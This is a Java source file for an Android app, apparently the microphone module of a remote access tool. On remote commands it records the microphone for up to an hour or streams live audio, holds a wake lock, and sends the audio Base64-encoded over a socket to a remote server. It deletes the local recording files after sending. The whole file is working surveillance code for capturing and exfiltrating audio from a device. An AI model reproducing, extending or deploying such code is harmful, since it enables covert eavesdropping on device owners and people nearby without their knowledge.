package com.fason.app.features.mic;

import android.Manifest;
import android.content.Context;
import android.content.pm.ServiceInfo;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.TransferHelper;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;
import org.json.JSONObject;
import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public final class MicManager {
    private static volatile MediaRecorder recorder;
    private static volatile File audioFile;
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();
    private static final AtomicBoolean recording = new AtomicBoolean(false);
    private static volatile Runnable stopTask;
    private static volatile String currentCmdId = null;
    private static volatile PowerManager.WakeLock recWakeLock;
    private static final AtomicBoolean streaming = new AtomicBoolean(false);
    private static volatile Thread streamThread;
    private static volatile AudioRecord audioRecord;
    private static final int STREAM_SAMPLE_RATE = 8000;
    private static final int STREAM_CHANNEL = AudioFormat.CHANNEL_IN_MONO;
    private static final int STREAM_ENCODING = AudioFormat.ENCODING_PCM_16BIT;

    private MicManager() {}
    public static boolean isRecording() {
        return recording.get();
    }

    public static boolean isStreaming() {
        return streaming.get();
    }

    public static void startStream(String cmdId) {
        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendError("No mic permission", cmdId);
            return;
        }
        if (!streaming.compareAndSet(false, true)) {
            sendError("Already streaming", cmdId);
            return;
        }
        if (recording.get()) {
            streaming.set(false);
            sendError("Cannot stream while recording", cmdId);
            return;
        }
        acquireRecWakeLock();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }
        int minBuf = AudioRecord.getMinBufferSize(STREAM_SAMPLE_RATE, STREAM_CHANNEL, STREAM_ENCODING);
        int bufSize = Math.max(minBuf * 2, 4096);
        try {
            final AudioRecord ar = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                STREAM_SAMPLE_RATE,
                STREAM_CHANNEL,
                STREAM_ENCODING,
                bufSize);
            if (ar.getState() != AudioRecord.STATE_INITIALIZED) {
                try { ar.release(); } catch (Exception ignored) {}
                streaming.set(false);
                releaseRecWakeLock();
                releaseType();
                sendError("AudioRecord init failed", cmdId);
                return;
            }
            audioRecord = ar;
            ar.startRecording();
            sendStreamStatus("streaming", cmdId);
            streamThread = new Thread(() -> {
                byte[] buf = new byte[bufSize];
                while (streaming.get() && !Thread.interrupted()) {
                    if (SocketClient.getInstance() == null || !SocketClient.getInstance().isConnected()) break;
                    int read = ar.read(buf, 0, buf.length);
                    if (read > 0) {
                        byte[] chunk = new byte[read];
                        System.arraycopy(buf, 0, chunk, 0, read);
                        sendStreamChunk(chunk);
                    }
                }
                try { ar.stop(); } catch (Exception ignored) {}
                try { ar.release(); } catch (Exception ignored) {}
                if (audioRecord == ar) audioRecord = null;
                if (streaming.compareAndSet(true, false)) {
                    releaseRecWakeLock();
                    releaseType();
                }
            }, "mic-stream");
            streamThread.start();
        } catch (Exception e) {
            if (audioRecord != null) { try { audioRecord.release(); } catch (Exception ignored) {} audioRecord = null; }
            streaming.set(false);
            releaseRecWakeLock();
            releaseType();
            sendError("Stream start failed: " + e.getMessage(), cmdId);
        }
    }

    public static void stopStream(String cmdId) {
        if (!streaming.compareAndSet(true, false)) return;
        if (streamThread != null) {
            streamThread.interrupt();
            streamThread = null;
        }
        releaseRecWakeLock();
        releaseType();
        sendStreamStatus("stopped", cmdId);
    }

    public static void shutdown() {
        streaming.set(false);
        recording.set(false);
        if (streamThread != null) { streamThread.interrupt(); streamThread = null; }
        if (stopTask != null) { handler.removeCallbacks(stopTask); stopTask = null; }
        if (audioRecord != null) {
            try { audioRecord.stop(); } catch (Exception ignored) {}
            try { audioRecord.release(); } catch (Exception ignored) {}
            audioRecord = null;
        }
        if (recorder != null) {
            try { recorder.release(); } catch (Exception ignored) {}
            recorder = null;
        }
        if (audioFile != null) { audioFile.delete(); audioFile = null; }
        releaseRecWakeLock();
        releaseType();
        exec.shutdownNow();
    }

    private static void sendStreamChunk(byte[] data) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STREAM_AUDIO, true);
            obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
            obj.put(Protocol.KEY_SIZE, data.length);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
        } catch (Exception ignored) {}
    }

    private static void sendStreamStatus(String status, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STREAM_AUDIO, true);
            obj.put(Protocol.KEY_STATUS, status);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            if (cmdId != null && !cmdId.isEmpty()) obj.put(Protocol.KEY_CMD_ID, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
        } catch (Exception ignored) {}
    }

    public static void start(int seconds, String cmdId) {
        if (seconds <= 0 || seconds > 3600) {
            sendError("Invalid duration: " + seconds, cmdId);
            return;
        }
        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendError("No mic permission", cmdId);
            return;
        }
        if (streaming.get()) {
            sendError("Cannot record while streaming", cmdId);
            return;
        }
        stop(null);
        if (!recording.compareAndSet(false, true)) return;
        currentCmdId = cmdId;
        acquireRecWakeLock();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }
        try {
            File cache = FasonApp.getContext().getCacheDir();
            if (cache == null) {
                recording.set(false);
                releaseRecWakeLock();
                return;
            }
            audioFile = File.createTempFile("rec_", ".mp4", cache);
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            final String stopCmdId = cmdId;
            final int finalSeconds = seconds;
            stopTask = () -> {
                stop(stopCmdId);
            };
            handler.postDelayed(stopTask, seconds * 1000L);
            sendStatus("recording", seconds, cmdId);
        } catch (Exception e) {
            recording.set(false);
            releaseRecWakeLock();
            sendError("Recording failed: " + e.getMessage(), cmdId);
            releaseType();
            if (recorder != null) {
                try { recorder.release(); } catch (Exception ignored) {}
                recorder = null;
            }
            if (audioFile != null) { audioFile.delete(); audioFile = null; }
        }
    }

    public static synchronized void stop(String cmdId) {
        if (stopTask != null) {
            handler.removeCallbacks(stopTask);
            stopTask = null;
        }
        final File fileToSend;
        try {
            if (recorder != null) {
                try { recorder.stop(); } catch (Exception ignored) {}
                try { recorder.release(); } catch (Exception ignored) {}
                recorder = null;
            }
        } catch (Exception ignored) {} finally {
            fileToSend = audioFile;
            audioFile = null;
        }
        recording.set(false);
        releaseType();
        releaseRecWakeLock();
        if (cmdId != null && fileToSend != null) {
            final String finalCmdId = cmdId;
            sendStatus("stopped", 0, finalCmdId);
            exec.execute(() -> sendAudioFile(fileToSend, finalCmdId));
        } else if (fileToSend != null) {
            fileToSend.delete();
        }
        if (cmdId != null && currentCmdId != null && currentCmdId.equals(cmdId)) {
            currentCmdId = null;
        }
    }

    private static void releaseType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) svc.releaseType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }
    }

    private static void acquireRecWakeLock() {
        try {
            if (recWakeLock == null) {
                PowerManager pm = (PowerManager) FasonApp.getContext().getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    recWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "fason:mic_rec");
                    recWakeLock.setReferenceCounted(false);
                }
            }
            if (recWakeLock != null && !recWakeLock.isHeld()) {
                recWakeLock.acquire(65 * 60 * 1000L);
            }
        } catch (Exception ignored) {}
    }

    private static void releaseRecWakeLock() {
        try {
            if (recWakeLock != null && recWakeLock.isHeld()) {
                recWakeLock.release();
            }
        } catch (Exception ignored) {}
    }

    private static void sendAudioFile(File fileToSend, String cmdId) {
        try {
            if (fileToSend == null || !fileToSend.exists()) {
                sendError("Audio file not found", cmdId);
                return;
            }
            if (TransferHelper.shouldChunk(fileToSend.length())) {
                JSONObject meta = new JSONObject();
                meta.put(Protocol.KEY_FILE, true);
                meta.put(Protocol.KEY_NAME, fileToSend.getName());
                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(meta, cmdId);
                TransferHelper.streamFile(
                    SocketClient.getInstance().getSocket(),
                    Protocol.MIC, fileToSend, meta);
            } else {
                byte[] data = TransferHelper.readSmallFile(fileToSend);
                if (data == null) { sendError("Read failed", cmdId); return; }
                JSONObject obj = new JSONObject();
                obj.put(Protocol.KEY_FILE, true);
                obj.put(Protocol.KEY_NAME, fileToSend.getName());
                obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
                obj.put(Protocol.KEY_SIZE, data.length);
                obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(obj, cmdId);
                SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
            }
        } catch (Exception e) {
            sendError("Send failed: " + e.getMessage(), cmdId);
        } finally {
            if (fileToSend != null) {
                fileToSend.delete();
            }
        }
    }

    private static void sendStatus(String status, int duration, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STATUS, status);
            obj.put(Protocol.KEY_DURATION, duration);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
        } catch (Exception ignored) {}
    }

    private static void sendError(String error, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_ERROR, error);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
        } catch (Exception ignored) {}
    }

    private static void attachCmdId(JSONObject obj, String cmdId) {
        if (cmdId != null && !cmdId.isEmpty()) {
            try { obj.put(Protocol.KEY_CMD_ID, cmdId); } catch (Exception ignored) {}
        }
    }
}
